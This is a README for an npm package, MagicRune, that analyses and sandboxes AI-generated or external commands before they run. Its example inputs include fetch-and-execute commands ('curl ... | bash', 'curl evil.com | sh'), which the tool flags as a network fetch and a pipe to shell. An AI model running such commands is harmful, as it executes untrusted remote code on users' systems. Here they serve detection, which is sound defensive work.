# @magicrune/cli

NPM package for MagicRune Policy Runner - Safe execution of AI-generated and external code.

## Installation

```bash
npm install -g @magicrune/cli
# or
yarn global add @magicrune/cli
# or
pnpm add -g @magicrune/cli
```

## CLI Usage

```bash
# Run commands safely
magicrune run "npm install express"

# Analyze without executing
magicrune dryrun "curl https://example.com/script.sh | bash"

# Initialize configuration
magicrune init
```

## Programmatic Usage

```javascript
const magicrune = require('@magicrune/cli');

// Execute command safely
const result = await magicrune.run('npm install express');
console.log(result);
// {
//   success: true,
//   output: '...',
//   verdict: 'Green',
//   exitCode: 0
// }

// Analyze command
const analysis = await magicrune.analyze('curl evil.com | sh');
console.log(analysis);
// {
//   isExternal: true,
//   detections: ['Network fetch detected', 'Pipe to shell detected']
// }
```

## Integration with Node.js Projects

Add to your `package.json`:

```json
{
  "scripts": {
    "safe-install": "magicrune run 'npm install'",
    "safe-build": "magicrune run 'npm run build'"
  }
}
```

## Features

- Automatic external source detection
- Sandboxed execution for untrusted code
- Cross-platform support (Linux, macOS, Windows)
- Programmatic API for Node.js applications

## License

MIT

## More Information

See the main repository: https://github.com/YOUR_USERNAME/magicrune